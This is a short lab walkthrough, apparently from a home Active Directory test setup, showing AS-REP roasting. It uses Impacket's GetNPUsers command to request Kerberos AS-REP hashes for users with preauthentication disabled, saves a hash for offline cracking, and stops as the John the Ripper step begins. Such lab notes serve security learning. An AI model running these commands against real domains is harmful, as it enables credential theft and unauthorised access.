# AS-REP roasting

# Prerequisite: At least one domain user has the “Do not require Kerberos preauthentication” flag enabled. 
# In our case, we configured the user bessy.bambie manually in ADUC (Active Directory Users and Computers).

# 1. Create a user list based on earlier enumeration (e.g., via enum4linux or crackmapexec).

# 2. Use Impacket's GetNPUsers.py to request AS-REP hashes from the domain controller. 
# This works without authentication for users who have pre-auth disabled.

impacket-GetNPUsers offensive.local/ -dc-ip 192.168.56.2 -no-pass -usersfile users.txt

# 3. If the user is vulnerable, the tool returns an AS-REP hash (format: $krb5asrep$...)
# Copy the full hash output into a file for cracking.

echo '$krb5asrep$23$bessy.bambie@OFFENSIVE.LOCAL:...' > asrep_hashes.txt

# 4. Crack the AS-REP hash offline using John the Ripper ...
